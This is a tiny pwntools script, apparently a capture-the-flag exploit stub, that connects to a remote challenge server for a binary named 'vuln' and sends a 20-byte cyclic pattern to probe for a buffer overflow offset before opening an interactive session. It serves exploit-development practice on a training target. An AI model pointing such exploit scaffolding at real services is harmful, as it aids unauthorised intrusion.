from pwn import *
elf = ELF('vuln')

#io = process('./vuln')
io = remote('chatelaine.cylabacademy.net', 23729)

payload = cyclic(20)

io.sendline(payload)
io.interactive()
